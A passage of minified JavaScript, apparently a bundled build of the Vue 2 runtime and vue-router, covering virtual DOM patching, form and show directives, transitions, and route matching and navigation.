t,r=a.remove.length+1;for(o(e)?e.listeners+=r:e=function(n,e){function t(){0==--t.listeners&&d(n)}return t.listeners=e,t}(n.elm,r),o(t=n.componentInstance)&&o(t=t._vnode)&&o(t.data)&&w(t,e),t=0;t<a.remove.length;++t)a.remove[t](n,e);o(t=n.data.hook)&&o(t=t.remove)?t(n,e):e()}else d(n.elm)}function B(n,e,t,a){for(var r=t;r<a;r++){var i=e[r];if(o(i)&&Ba(n,i))return r}}function A(n,e,t,r,l,c){if(n!==e){o(e.elm)&&o(r)&&(e=r[l]=fn(e));var d=e.elm=n.elm;if(s(n.isAsyncPlaceholder))o(e.asyncFactory.resolved)?j(n.elm,e,t):e.isAsyncPlaceholder=!0;else if(s(e.isStatic)&&s(n.isStatic)&&e.key===n.key&&(s(e.isCloned)||s(e.isOnce)))e.componentInstance=n.componentInstance;else{var m,h=e.data;o(h)&&o(m=h.hook)&&o(m=m.prepatch)&&m(n,e);var g=n.children,b=e.children;if(o(h)&&f(e)){for(m=0;m<a.update.length;++m)a.update[m](n,e);o(m=h.hook)&&o(m=m.update)&&m(n,e)}i(e.text)?o(g)&&o(b)?g!==b&&function(n,e,t,a,r){var s,l,c,d=0,m=0,h=e.length-1,g=e[0],f=e[h],b=t.length-1,v=t[0],y=t[b],k=!r;for(0;d<=h&&m<=b;)i(g)?g=e[++d]:i(f)?f=e[--h]:Ba(g,v)?(A(g,v,a,t,m),g=e[++d],v=t[++m]):Ba(f,y)?(A(f,y,a,t,b),f=e[--h],y=t[--b]):Ba(g,y)?(A(g,y,a,t,b),k&&p.insertBefore(n,g.elm,p.nextSibling(f.elm)),g=e[++d],y=t[--b]):Ba(f,v)?(A(f,v,a,t,m),k&&p.insertBefore(n,f.elm,g.elm),f=e[--h],v=t[++m]):(i(s)&&(s=Aa(e,d,h)),i(l=o(v.key)?s[v.key]:B(v,e,d,h))?u(v,a,n,g.elm,!1,t,m):Ba(c=e[l],v)?(A(c,v,a,t,m),e[l]=void 0,k&&p.insertBefore(n,c.elm,g.elm)):u(v,a,n,g.elm,!1,t,m),v=t[++m]);d>h?E(n,i(t[b+1])?null:t[b+1].elm,t,m,b,a):m>b&&x(e,d,h)}(d,g,b,t,c):o(b)?(o(n.text)&&p.setTextContent(d,""),E(d,null,b,0,b.length-1,t)):o(g)?x(g,0,g.length-1):o(n.text)&&p.setTextContent(d,""):n.text!==e.text&&p.setTextContent(d,e.text),o(h)&&o(m=h.hook)&&o(m=m.postpatch)&&m(n,e)}}}function C(n,e,t){if(s(t)&&o(n.parent))n.parent.data.pendingInsert=e;else for(var a=0;a<e.length;++a)e[a].data.hook.insert(e[a])}var S=v("attrs,class,staticClass,staticStyle,key");function j(n,e,t,a){var r,i=e.tag,l=e.data,c=e.children;if(a=a||l&&l.pre,e.elm=n,s(e.isComment)&&o(e.asyncFactory))return e.isAsyncPlaceholder=!0,!0;if(o(l)&&(o(r=l.hook)&&o(r=r.init)&&r(e,!0),o(r=e.componentInstance)))return m(e,t),!0;if(o(i)){if(o(c))if(n.hasChildNodes())if(o(r=l)&&o(r=r.domProps)&&o(r=r.innerHTML)){if(r!==n.innerHTML)return!1}else{for(var p=!0,d=n.firstChild,u=0;u<c.length;u++){if(!d||!j(d,c[u],t,a)){p=!1;break}d=d.nextSibling}if(!p||d)return!1}else g(e,c,t);if(o(l)){var h=!1;for(var f in l)if(!S(f)){h=!0,b(e,t);break}!h&&l.class&&qe(l.class)}}else n.data!==e.text&&(n.data=e.text);return!0}return function(n,e,t,r){if(!i(e)){var l,c=!1,d=[];if(i(n))c=!0,u(e,d);else{var m=o(n.nodeType);if(!m&&Ba(n,e))A(n,e,d,null,null,r);else{if(m){if(1===n.nodeType&&n.hasAttribute("data-server-rendered")&&(n.removeAttribute("data-server-rendered"),t=!0),s(t)&&j(n,e,d))return C(e,d,!0),n;l=n,n=new mn(p.tagName(l).toLowerCase(),{},[],void 0,l)}var h=n.elm,g=p.parentNode(h);if(u(e,d,h._leaveCb?null:g,p.nextSibling(h)),o(e.parent))for(var b=e.parent,v=f(e);b;){for(var y=0;y<a.destroy.length;++y)a.destroy[y](b);if(b.elm=e.elm,v){for(var E=0;E<a.create.length;++E)a.create[E](xa,b);var w=b.data.hook.insert;if(w.merged)for(var B=1;B<w.fns.length;B++)w.fns[B]()}else Ea(b);b=b.parent}o(g)?x([n],0,0):o(n.tag)&&k(n)}}return C(e,d,c),e.elm}o(n)&&k(n)}}({nodeOps:va,modules:[Oa,Ra,Ja,Za,or,Q?{create:Pr,activate:Pr,remove:function(n,e){!0!==n.data.show?Sr(n,e):e()}}:{}].concat(Ia)});K&&document.addEventListener("selectionchange",(function(){var n=document.activeElement;n&&n.vmodel&&Rr(n,"input")}));var Ir={inserted:function(n,e,t,a){"select"===t.tag?(a.elm&&!a.elm._vOptions?Jn(t,"postpatch",(function(){Ir.componentUpdated(n,e,t)})):zr(n,e,t.context),n._vOptions=[].map.call(n.options,Or)):("textarea"===t.tag||ba(n.type))&&(n._vModifiers=e.modifiers,e.modifiers.lazy||(n.addEventListener("compositionstart",Fr),n.addEventListener("compositionend",Mr),n.addEventListener("change",Mr),K&&(n.vmodel=!0)))},componentUpdated:function(n,e,t){if("select"===t.tag){zr(n,e,t.context);var a=n._vOptions,r=n._vOptions=[].map.call(n.options,Or);if(r.some((function(n,e){return!O(n,a[e])})))(n.multiple?e.value.some((function(n){return Lr(n,r)})):e.value!==e.oldValue&&Lr(e.value,r))&&Rr(n,"change")}}};function zr(n,e,t){Dr(n,e,t),(G||X)&&setTimeout((function(){Dr(n,e,t)}),0)}function Dr(n,e,t){var a=e.value,r=n.multiple;if(!r||Array.isArray(a)){for(var i,o,s=0,l=n.options.length;s<l;s++)if(o=n.options[s],r)i=F(a,Or(o))>-1,o.selected!==i&&(o.selected=i);else if(O(Or(o),a))return void(n.selectedIndex!==s&&(n.selectedIndex=s));r||(n.selectedIndex=-1)}}function Lr(n,e){return e.every((function(e){return!O(e,n)}))}function Or(n){return"_value"in n?n._value:n.value}function Fr(n){n.target.composing=!0}function Mr(n){n.target.composing&&(n.target.composing=!1,Rr(n.target,"input"))}function Rr(n,e){var t=document.createEvent("HTMLEvents");t.initEvent(e,!0,!0),n.dispatchEvent(t)}function Ur(n){return!n.componentInstance||n.data&&n.data.transition?n:Ur(n.componentInstance._vnode)}var qr={model:Ir,show:{bind:function(n,e,t){var a=e.value,r=(t=Ur(t)).data&&t.data.transition,i=n.__vOriginalDisplay="none"===n.style.display?"":n.style.display;a&&r?(t.data.show=!0,Cr(t,(function(){n.style.display=i}))):n.style.display=a?i:"none"},update:function(n,e,t){var a=e.value;!a!=!e.oldValue&&((t=Ur(t)).data&&t.data.transition?(t.data.show=!0,a?Cr(t,(function(){n.style.display=n.__vOriginalDisplay})):Sr(t,(function(){n.style.display="none"}))):n.style.display=a?n.__vOriginalDisplay:"none")},unbind:function(n,e,t,a,r){r||(n.style.display=n.__vOriginalDisplay)}}},Nr={name:String,appear:Boolean,css:Boolean,mode:String,type:String,enterClass:String,leaveClass:String,enterToClass:String,leaveToClass:String,enterActiveClass:String,leaveActiveClass:String,appearClass:String,appearActiveClass:String,appearToClass:String,duration:[Number,String,Object]};function $r(n){var e=n&&n.componentOptions;return e&&e.Ctor.options.abstract?$r(we(e.children)):n}function Hr(n){var e={},t=n.$options;for(var a in t.propsData)e[a]=n[a];var r=t._parentListeners;for(var a in r)e[A(a)]=r[a];return e}function Vr(n,e){if(/\d-keep-alive$/.test(e.tag))return n("keep-alive",{props:e.componentOptions.propsData})}var Jr=function(n){return n.tag||me(n)},Wr=function(n){return"show"===n.name},Qr={name:"transition",props:Nr,abstract:!0,render:function(n){var e=this,t=this.$slots.default;if(t&&(t=t.filter(Jr)).length){0;var a=this.mode;0;var r=t[0];if(function(n){for(;n=n.parent;)if(n.data.transition)return!0}(this.$vnode))return r;var i=$r(r);if(!i)return r;if(this._leaving)return Vr(n,r);var o="__transition-".concat(this._uid,"-");i.key=null==i.key?i.isComment?o+"comment":o+i.tag:l(i.key)?0===String(i.key).indexOf(o)?i.key:o+i.key:i.key;var s=(i.data||(i.data={})).transition=Hr(this),c=this._vnode,p=$r(c);if(i.data.directives&&i.data.directives.some(Wr)&&(i.data.show=!0),p&&p.data&&!function(n,e){return e.key===n.key&&e.tag===n.tag}(i,p)&&!me(p)&&(!p.componentInstance||!p.componentInstance._vnode.isComment)){var d=p.data.transition=_({},s);if("out-in"===a)return this._leaving=!0,Jn(d,"afterLeave",(function(){e._leaving=!1,e.$forceUpdate()})),Vr(n,r);if("in-out"===a){if(me(i))return c;var u,m=function(){u()};Jn(s,"afterEnter",m),Jn(s,"enterCancelled",m),Jn(d,"delayLeave",(function(n){u=n}))}}return r}}},Zr=_({tag:String,moveClass:String},Nr);function Gr(n){n.elm._moveCb&&n.elm._moveCb(),n.elm._enterCb&&n.elm._enterCb()}function Kr(n){n.data.newPos=n.elm.getBoundingClientRect()}function Xr(n){var e=n.data.pos,t=n.data.newPos,a=e.left-t.left,r=e.top-t.top;if(a||r){n.data.moved=!0;var i=n.elm.style;i.transform=i.WebkitTransform="translate(".concat(a,"px,").concat(r,"px)"),i.transitionDuration="0s"}}delete Zr.mode;var Yr={Transition:Qr,TransitionGroup:{props:Zr,beforeMount:function(){var n=this,e=this._update;this._update=function(t,a){var r=Ge(n);n.__patch__(n._vnode,n.kept,!1,!0),n._vnode=n.kept,r(),e.call(n,t,a)}},render:function(n){for(var e=this.tag||this.$vnode.data.tag||"span",t=Object.create(null),a=this.prevChildren=this.children,r=this.$slots.default||[],i=this.children=[],o=Hr(this),s=0;s<r.length;s++){if((p=r[s]).tag)if(null!=p.key&&0!==String(p.key).indexOf("__vlist"))i.push(p),t[p.key]=p,(p.data||(p.data={})).transition=o;else;}if(a){var l=[],c=[];for(s=0;s<a.length;s++){var p;(p=a[s]).data.transition=o,p.data.pos=p.elm.getBoundingClientRect(),t[p.key]?l.push(p):c.push(p)}this.kept=n(e,null,l),this.removed=c}return n(e,null,i)},updated:function(){var n=this.prevChildren,e=this.moveClass||(this.name||"v")+"-move";n.length&&this.hasMove(n[0].elm,e)&&(n.forEach(Gr),n.forEach(Kr),n.forEach(Xr),this._reflow=document.body.offsetHeight,n.forEach((function(n){if(n.data.moved){var t=n.elm,a=t.style;yr(t,e),a.transform=a.WebkitTransform=a.transitionDuration="",t.addEventListener(hr,t._moveCb=function n(a){a&&a.target!==t||a&&!/transform$/.test(a.propertyName)||(t.removeEventListener(hr,n),t._moveCb=null,Er(t,e))})}})))},methods:{hasMove:function(n,e){if(!ur)return!1;if(this._hasMove)return this._hasMove;var t=n.cloneNode();n._transitionClasses&&n._transitionClasses.forEach((function(n){cr(t,n)})),lr(t,e),t.style.display="none",this.$el.appendChild(t);var a=wr(t);return this.$el.removeChild(t),this._hasMove=a.hasTransform}}}};function ni(n,e){for(var t in e)n[t]=e[t];return n}Vt.config.mustUseProp=function(n,e,t){return"value"===t&&na(n)&&"button"!==e||"selected"===t&&"option"===n||"checked"===t&&"input"===n||"muted"===t&&"video"===n},Vt.config.isReservedTag=ga,Vt.config.isReservedAttr=Yt,Vt.config.getTagNamespace=function(n){return ha(n)?"svg":"math"===n?"math":void 0},Vt.config.isUnknownElement=function(n){if(!Q)return!0;if(ga(n))return!1;if(n=n.toLowerCase(),null!=fa[n])return fa[n];var e=document.createElement(n);return n.indexOf("-")>-1?fa[n]=e.constructor===window.HTMLUnknownElement||e.constructor===window.HTMLElement:fa[n]=/HTMLUnknownElement/.test(e.toString())},_(Vt.options.directives,qr),_(Vt.options.components,Yr),Vt.prototype.__patch__=Q?_r:z,Vt.prototype.$mount=function(n,e){return function(n,e,t){var a;n.$el=e,n.$options.render||(n.$options.render=hn),Ye(n,"beforeMount"),a=function(){n._update(n._render(),t)},new He(n,a,z,{before:function(){n._isMounted&&!n._isDestroyed&&Ye(n,"beforeUpdate")}},!0),t=!1;var r=n._preWatchers;if(r)for(var i=0;i<r.length;i++)r[i].run();return null==n.$vnode&&(n._isMounted=!0,Ye(n,"mounted")),n}(this,n=n&&Q?function(n){if("string"==typeof n){var e=document.querySelector(n);return e||document.createElement("div")}return n}(n):void 0,e)},Q&&setTimeout((function(){N.devtools&&sn&&sn.emit("init",Vt)}),0);var ei=/[!'()*]/g,ti=function(n){return"%"+n.charCodeAt(0).toString(16)},ai=/%2C/g,ri=function(n){return encodeURIComponent(n).replace(ei,ti).replace(ai,",")};function ii(n){try{return decodeURIComponent(n)}catch(n){0}return n}var oi=function(n){return null==n||"object"==typeof n?n:String(n)};function si(n){var e={};return(n=n.trim().replace(/^(\?|#|&)/,""))?(n.split("&").forEach((function(n){var t=n.replace(/\+/g," ").split("="),a=ii(t.shift()),r=t.length>0?ii(t.join("=")):null;void 0===e[a]?e[a]=r:Array.isArray(e[a])?e[a].push(r):e[a]=[e[a],r]})),e):e}function li(n){var e=n?Object.keys(n).map((function(e){var t=n[e];if(void 0===t)return"";if(null===t)return ri(e);if(Array.isArray(t)){var a=[];return t.forEach((function(n){void 0!==n&&(null===n?a.push(ri(e)):a.push(ri(e)+"="+ri(n)))})),a.join("&")}return ri(e)+"="+ri(t)})).filter((function(n){return n.length>0})).join("&"):null;return e?"?"+e:""}var ci=/\/?$/;function pi(n,e,t,a){var r=a&&a.options.stringifyQuery,i=e.query||{};try{i=di(i)}catch(n){}var o={name:e.name||n&&n.name,meta:n&&n.meta||{},path:e.path||"/",hash:e.hash||"",query:i,params:e.params||{},fullPath:hi(e,r),matched:n?mi(n):[]};return t&&(o.redirectedFrom=hi(t,r)),Object.freeze(o)}function di(n){if(Array.isArray(n))return n.map(di);if(n&&"object"==typeof n){var e={};for(var t in n)e[t]=di(n[t]);return e}return n}var ui=pi(null,{path:"/"});function mi(n){for(var e=[];n;)e.unshift(n),n=n.parent;return e}function hi(n,e){var t=n.path,a=n.query;void 0===a&&(a={});var r=n.hash;return void 0===r&&(r=""),(t||"/")+(e||li)(a)+r}function gi(n,e,t){return e===ui?n===e:!!e&&(n.path&&e.path?n.path.replace(ci,"")===e.path.replace(ci,"")&&(t||n.hash===e.hash&&fi(n.query,e.query)):!(!n.name||!e.name)&&(n.name===e.name&&(t||n.hash===e.hash&&fi(n.query,e.query)&&fi(n.params,e.params))))}function fi(n,e){if(void 0===n&&(n={}),void 0===e&&(e={}),!n||!e)return n===e;var t=Object.keys(n).sort(),a=Object.keys(e).sort();return t.length===a.length&&t.every((function(t,r){var i=n[t];if(a[r]!==t)return!1;var o=e[t];return null==i||null==o?i===o:"object"==typeof i&&"object"==typeof o?fi(i,o):String(i)===String(o)}))}function bi(n){for(var e=0;e<n.matched.length;e++){var t=n.matched[e];for(var a in t.instances){var r=t.instances[a],i=t.enteredCbs[a];if(r&&i){delete t.enteredCbs[a];for(var o=0;o<i.length;o++)r._isBeingDestroyed||i[o](r)}}}}var vi={name:"RouterView",functional:!0,props:{name:{type:String,default:"default"}},render:function(n,e){var t=e.props,a=e.children,r=e.parent,i=e.data;i.routerView=!0;for(var o=r.$createElement,s=t.name,l=r.$route,c=r._routerViewCache||(r._routerViewCache={}),p=0,d=!1;r&&r._routerRoot!==r;){var u=r.$vnode?r.$vnode.data:{};u.routerView&&p++,u.keepAlive&&r._directInactive&&r._inactive&&(d=!0),r=r.$parent}if(i.routerViewDepth=p,d){var m=c[s],h=m&&m.component;return h?(m.configProps&&yi(h,i,m.route,m.configProps),o(h,i,a)):o()}var g=l.matched[p],f=g&&g.components[s];if(!g||!f)return c[s]=null,o();c[s]={component:f},i.registerRouteInstance=function(n,e){var t=g.instances[s];(e&&t!==n||!e&&t===n)&&(g.instances[s]=e)},(i.hook||(i.hook={})).prepatch=function(n,e){g.instances[s]=e.componentInstance},i.hook.init=function(n){n.data.keepAlive&&n.componentInstance&&n.componentInstance!==g.instances[s]&&(g.instances[s]=n.componentInstance),bi(l)};var b=g.props&&g.props[s];return b&&(ni(c[s],{route:l,configProps:b}),yi(f,i,l,b)),o(f,i,a)}};function yi(n,e,t,a){var r=e.props=function(n,e){switch(typeof e){case"undefined":return;case"object":return e;case"function":return e(n);case"boolean":return e?n.params:void 0;default:0}}(t,a);if(r){r=e.props=ni({},r);var i=e.attrs=e.attrs||{};for(var o in r)n.props&&o in n.props||(i[o]=r[o],delete r[o])}}function Ei(n,e,t){var a=n.charAt(0);if("/"===a)return n;if("?"===a||"#"===a)return e+n;var r=e.split("/");t&&r[r.length-1]||r.pop();for(var i=n.replace(/^\//,"").split("/"),o=0;o<i.length;o++){var s=i[o];".."===s?r.pop():"."!==s&&r.push(s)}return""!==r[0]&&r.unshift(""),r.join("/")}function ki(n){return n.replace(/\/(?:\s*\/)+/g,"/")}var xi=Array.isArray||function(n){return"[object Array]"==Object.prototype.toString.call(n)},wi=Fi,Bi=Ti,Ai=function(n,e){return _i(Ti(n,e),e)},Ci=_i,Si=Oi,ji=new RegExp(["(\\\\.)","([\\/.])?(?:(?:\\:(\\w+)(?:\\(((?:\\\\.|[^\\\\()])+)\\))?|\\(((?:\\\\.|[^\\\\()])+)\\))([+*?])?|(\\*))"].join("|"),"g");function Ti(n,e){for(var t,a=[],r=0,i=0,o="",s=e&&e.delimiter||"/";null!=(t=ji.exec(n));){var l=t[0],c=t[1],p=t.index;if(o+=n.slice(i,p),i=p+l.length,c)o+=c[1];else{var d=n[i],u=t[2],m=t[3],h=t[4],g=t[5],f=t[6],b=t[7];o&&(a.push(o),o="");var v=null!=u&&null!=d&&d!==u,y="+"===f||"*"===f,E="?"===f||"*"===f,k=t[2]||s,x=h||g;a.push({name:m||r++,prefix:u||"",delimiter:k,optional:E,repeat:y,partial:v,asterisk:!!b,pattern:x?zi(x):b?".*":"[^"+Ii(k)+"]+?"})}}return i<n.length&&(o+=n.substr(i)),o&&a.push(o),a}function Pi(n){return encodeURI(n).replace(/[\/?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()}))}function _i(n,e){for(var t=new Array(n.length),a=0;a<n.length;a++)"object"==typeof n[a]&&(t[a]=new RegExp("^(?:"+n[a].pattern+")$",Li(e)));return function(e,a){for(var r="",i=e||{},o=(a||{}).pretty?Pi:encodeURIComponent,s=0;s<n.length;s++){var l=n[s];if("string"!=typeof l){var c,p=i[l.name];if(null==p){if(l.optional){l.partial&&(r+=l.prefix);continue}throw new TypeError('Expected "'+l.name+'" to be defined')}if(xi(p)){if(!l.repeat)throw new TypeError('Expected "'+l.name+'" to not repeat, but received `'+JSON.stringify(p)+"`");if(0===p.length){if(l.optional)continue;throw new TypeError('Expected "'+l.name+'" to not be empty')}for(var d=0;d<p.length;d++){if(c=o(p[d]),!t[s].test(c))throw new TypeError('Expected all "'+l.name+'" to match "'+l.pattern+'", but received `'+JSON.stringify(c)+"`");r+=(0===d?l.prefix:l.delimiter)+c}}else{if(c=l.asterisk?encodeURI(p).replace(/[?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()})):o(p),!t[s].test(c))throw new TypeError('Expected "'+l.name+'" to match "'+l.pattern+'", but received "'+c+'"');r+=l.prefix+c}}else r+=l}return r}}function Ii(n){return n.replace(/([.+*?=^!:${}()[\]|\/\\])/g,"\\$1")}function zi(n){return n.replace(/([=!:$\/()])/g,"\\$1")}function Di(n,e){return n.keys=e,n}function Li(n){return n&&n.sensitive?"":"i"}function Oi(n,e,t){xi(e)||(t=e||t,e=[]);for(var a=(t=t||{}).strict,r=!1!==t.end,i="",o=0;o<n.length;o++){var s=n[o];if("string"==typeof s)i+=Ii(s);else{var l=Ii(s.prefix),c="(?:"+s.pattern+")";e.push(s),s.repeat&&(c+="(?:"+l+c+")*"),i+=c=s.optional?s.partial?l+"("+c+")?":"(?:"+l+"("+c+"))?":l+"("+c+")"}}var p=Ii(t.delimiter||"/"),d=i.slice(-p.length)===p;return a||(i=(d?i.slice(0,-p.length):i)+"(?:"+p+"(?=$))?"),i+=r?"$":a&&d?"":"(?="+p+"|$)",Di(new RegExp("^"+i,Li(t)),e)}function Fi(n,e,t){return xi(e)||(t=e||t,e=[]),t=t||{},n instanceof RegExp?function(n,e){var t=n.source.match(/\((?!\?)/g);if(t)for(var a=0;a<t.length;a++)e.push({name:a,prefix:null,delimiter:null,optional:!1,repeat:!1,partial:!1,asterisk:!1,pattern:null});return Di(n,e)}(n,e):xi(n)?function(n,e,t){for(var a=[],r=0;r<n.length;r++)a.push(Fi(n[r],e,t).source);return Di(new RegExp("(?:"+a.join("|")+")",Li(t)),e)}(n,e,t):function(n,e,t){return Oi(Ti(n,t),e,t)}(n,e,t)}wi.parse=Bi,wi.compile=Ai,wi.tokensToFunction=Ci,wi.tokensToRegExp=Si;var Mi=Object.create(null);function Ri(n,e,t){e=e||{};try{var a=Mi[n]||(Mi[n]=wi.compile(n));return"string"==typeof e.pathMatch&&(e[0]=e.pathMatch),a(e,{pretty:!0})}catch(n){return""}finally{delete e[0]}}function Ui(n,e,t,a){var r="string"==typeof n?{path:n}:n;if(r._normalized)return r;if(r.name){var i=(r=ni({},n)).params;return i&&"object"==typeof i&&(r.params=ni({},i)),r}if(!r.path&&r.params&&e){(r=ni({},r))._normalized=!0;var o=ni(ni({},e.params),r.params);if(e.name)r.name=e.name,r.params=o;else if(e.matched.length){var s=e.matched[e.matched.length-1].path;r.path=Ri(s,o,e.path)}else 0;return r}var l=function(n){var e="",t="",a=n.indexOf("#");a>=0&&(e=n.slice(a),n=n.slice(0,a));var r=n.indexOf("?");return r>=0&&(t=n.slice(r+1),n=n.slice(0,r)),{path:n,query:t,hash:e}}(r.path||""),c=e&&e.path||"/",p=l.path?Ei(l.path,c,t||r.append):c,d=function(n,e,t){void 0===e&&(e={});var a,r=t||si;try{a=r(n||"")}catch(n){a={}}for(var i in e){var o=e[i];a[i]=Array.isArray(o)?o.map(oi):oi(o)}return a}(l.query,r.query,a&&a.options.parseQuery),u=r.hash||l.hash;return u&&"#"!==u.charAt(0)&&(u="#"+u),{_normalized:!0,path:p,query:d,hash:u}}var qi,Ni=function(){},$i={name:"RouterLink",props:{to:{type:[String,Object],required:!0},tag:{type:String,default:"a"},custom:Boolean,exact:Boolean,exactPath:Boolean,append:Boolean,replace:Boolean,activeClass:String,exactActiveClass:String,ariaCurrentValue:{type:String,default:"page"},event:{type:[String,Array],default:"click"}},render:function(n){var e=this,t=this.$router,a=this.$route,r=t.resolve(this.to,a,this.append),i=r.location,o=r.route,s=r.href,l={},c=t.options.linkActiveClass,p=t.options.linkExactActiveClass,d=null==c?"router-link-active":c,u=null==p?"router-link-exact-active":p,m=null==this.activeClass?d:this.activeClass,h=null==this.exactActiveClass?u:this.exactActiveClass,g=o.redirectedFrom?pi(null,Ui(o.redirectedFrom),null,t):o;l[h]=gi(a,g,this.exactPath),l[m]=this.exact||this.exactPath?l[h]:function(n,e){return 0===n.path.replace(ci,"/").indexOf(e.path.replace(ci,"/"))&&(!e.hash||n.hash===e.hash)&&function(n,e){for(var t in e)if(!(t in n))return!1;return!0}(n.query,e.query)}(a,g);var f=l[h]?this.ariaCurrentValue:null,b=function(n){Hi(n)&&(e.replace?t.replace(i,Ni):t.push(i,Ni))},v={click:Hi};Array.isArray(this.event)?this.event.forEach((function(n){v[n]=b})):v[this.event]=b;var y={class:l},E=!this.$scopedSlots.$hasNormal&&this.$scopedSlots.default&&this.$scopedSlots.default({href:s,route:o,navigate:b,isActive:l[m],isExactActive:l[h]});if(E){if(1===E.length)return E[0];if(E.length>1||!E.length)return 0===E.length?n():n("span",{},E)}if("a"===this.tag)y.on=v,y.attrs={href:s,"aria-current":f};else{var k=function n(e){var t;if(e)for(var a=0;a<e.length;a++){if("a"===(t=e[a]).tag)return t;if(t.children&&(t=n(t.children)))return t}}(this.$slots.default);if(k){k.isStatic=!1;var x=k.data=ni({},k.data);for(var w in x.on=x.on||{},x.on){var B=x.on[w];w in v&&(x.on[w]=Array.isArray(B)?B:[B])}for(var A in v)A in x.on?x.on[A].push(v[A]):x.on[A]=b;var C=k.data.attrs=ni({},k.data.attrs);C.href=s,C["aria-current"]=f}else y.on=v}return n(this.tag,y,this.$slots.default)}};function Hi(n){if(!(n.metaKey||n.altKey||n.ctrlKey||n.shiftKey||n.defaultPrevented||void 0!==n.button&&0!==n.button)){if(n.currentTarget&&n.currentTarget.getAttribute){var e=n.currentTarget.getAttribute("target");if(/\b_blank\b/i.test(e))return}return n.preventDefault&&n.preventDefault(),!0}}var Vi="undefined"!=typeof window;function Ji(n,e,t,a,r){var i=e||[],o=t||Object.create(null),s=a||Object.create(null);n.forEach((function(n){!function n(e,t,a,r,i,o){var s=r.path,l=r.name;0;var c=r.pathToRegexpOptions||{},p=function(n,e,t){t||(n=n.replace(/\/$/,""));if("/"===n[0])return n;if(null==e)return n;return ki(e.path+"/"+n)}(s,i,c.strict);"boolean"==typeof r.caseSensitive&&(c.sensitive=r.caseSensitive);var d={path:p,regex:Wi(p,c),components:r.components||{default:r.component},alias:r.alias?"string"==typeof r.alias?[r.alias]:r.alias:[],instances:{},enteredCbs:{},name:l,parent:i,matchAs:o,redirect:r.redirect,beforeEnter:r.beforeEnter,meta:r.meta||{},props:null==r.props?{}:r.components?r.props:{default:r.props}};r.children&&r.children.forEach((function(r){var i=o?ki(o+"/"+r.path):void 0;n(e,t,a,r,d,i)}));t[d.path]||(e.push(d.path),t[d.path]=d);if(void 0!==r.alias)for(var u=Array.isArray(r.alias)?r.alias:[r.alias],m=0;m<u.length;++m){0;var h={path:u[m],children:r.children};n(e,t,a,h,i,d.path||"/")}l&&(a[l]||(a[l]=d))}(i,o,s,n,r)}));for(var l=0,c=i.length;l<c;l++)"*"===i[l]&&(i.push(i.splice(l,1)[0]),c--,l--);return{pathList:i,pathMap:o,nameMap:s}}function Wi(n,e){return wi(n,[],e)}function Qi(n,e){var t=Ji(n),a=t.pathList,r=t.pathMap,i=t.nameMap;function o(n,t,o){var s=Ui(n,t,!1,e),c=s.name;if(c){var p=i[c];if(!p)return l(null,s);var d=p.regex.keys.filter((function(n){return!n.optional})).map((function(n){return n.name}));if("object"!=typeof s.params&&(s.params={}),t&&"object"==typeof t.params)for(var u in t.params)!(u in s.params)&&d.indexOf(u)>-1&&(s.params[u]=t.params[u]);return s.path=Ri(p.path,s.params),l(p,s,o)}if(s.path){s.params={};for(var m=0;m<a.length;m++){var h=a[m],g=r[h];if(Zi(g.regex,s.path,s.params))return l(g,s,o)}}return l(null,s)}function s(n,t){var a=n.redirect,r="function"==typeof a?a(pi(n,t,null,e)):a;if("string"==typeof r&&(r={path:r}),!r||"object"!=typeof r)return l(null,t);var s=r,c=s.name,p=s.path,d=t.query,u=t.hash,m=t.params;if(d=s.hasOwnProperty("query")?s.query:d,u=s.hasOwnProperty("hash")?s.hash:u,m=s.hasOwnProperty("params")?s.params:m,c){i[c];return o({_normalized:!0,name:c,query:d,hash:u,params:m},void 0,t)}if(p){var h=function(n,e){return Ei(n,e.parent?e.parent.path:"/",!0)}(p,n);return o({_normalized:!0,path:Ri(h,m),query:d,hash:u},void 0,t)}return l(null,t)}function l(n,t,a){return n&&n.redirect?s(n,a||t):n&&n.matchAs?function(n,e,t){var a=o({_normalized:!0,path:Ri(t,e.params)});if(a){var r=a.matched,i=r[r.length-1];return e.params=a.params,l(i,e)}return l(null,e)}(0,t,n.matchAs):pi(n,t,a,e)}return{match:o,addRoute:function(n,e){var t="object"!=typeof n?i[n]:void 0;Ji([e||n],a,r,i,t),t&&t.alias.length&&Ji(t.alias.map((function(n){return{path:n,children:[e]}})),a,r,i,t)},getRoutes:function(){return a.map((function(n){return r[n]}))},addRoutes:function(n){Ji(n,a,r,i)}}}function Zi(n,e,t){var a=e.match(n);if(!a)return!1;if(!t)return!0;for(var r=1,i=a.length;r<i;++r){var o=n.keys[r-1];o&&(t[o.name||"pathMatch"]="string"==typeof a[r]?ii(a[r]):a[r])}return!0}var Gi=Vi&&window.performance&&window.performance.now?window.performance:Date;function Ki(){return Gi.now().toFixed(3)}var Xi=Ki();function Yi(){return Xi}function no(n){return Xi=n}var eo=Object.create(null);function to(){"scrollRestoration"in window.history&&(window.history.scrollRestoration="manual");var n=window.location.protocol+"//"+window.location.host,e=window.location.href.replace(n,""),t=ni({},window.history.state);return t.key=Yi(),window.history.replaceState(t,"",e),window.addEventListener("popstate",io),function(){window.removeEventListener("popstate",io)}}function ao(n,e,t,a){if(n.app){var r=n.options.scrollBehavior;r&&n.app.$nextTick((function(){var i=function(){var n=Yi();if(n)return eo[n]}(),o=r.call(n,e,t,a?i:null);o&&("function"==typeof o.then?o.then((function(n){po(n,i)})).catch((function(n){0})):po(o,i))}))}}function ro(){var n=Yi();n&&(eo[n]={x:window.pageXOffset,y:window.pageYOffset})}function io(n){ro(),n.state&&n.state.key&&no(n.state.key)}function oo(n){return lo(n.x)||lo(n.y)}function so(n){return{x:lo(n.x)?n.x:window.pageXOffset,y:lo(n.y)?n.y:window.pageYOffset}}function lo(n){return"number"==typeof n}var co=/^#\d/;function po(n,e){var t,a="object"==typeof n;if(a&&"string"==typeof n.selector){var r=co.test(n.selector)?document.getElementById(n.selector.slice(1)):document.querySelector(n.selector);if(r){var i=n.offset&&"object"==typeof n.offset?n.offset:{};e=function(n,e){var t=document.documentElement.getBoundingClientRect(),a=n.getBoundingClientRect();return{x:a.left-t.left-e.x,y:a.top-t.top-e.y}}(r,i={x:lo((t=i).x)?t.x:0,y:lo(t.y)?t.y:0})}else oo(n)&&(e=so(n))}else a&&oo(n)&&(e=so(n));e&&("scrollBehavior"in document.documentElement.style?window.scrollTo({left:e.x,top:e.y,behavior:n.behavior}):window.scrollTo(e.x,e.y))}var uo,mo=Vi&&((-1===(uo=window.navigator.userAgent).indexOf("Android 2.")&&-1===uo.indexOf("Android 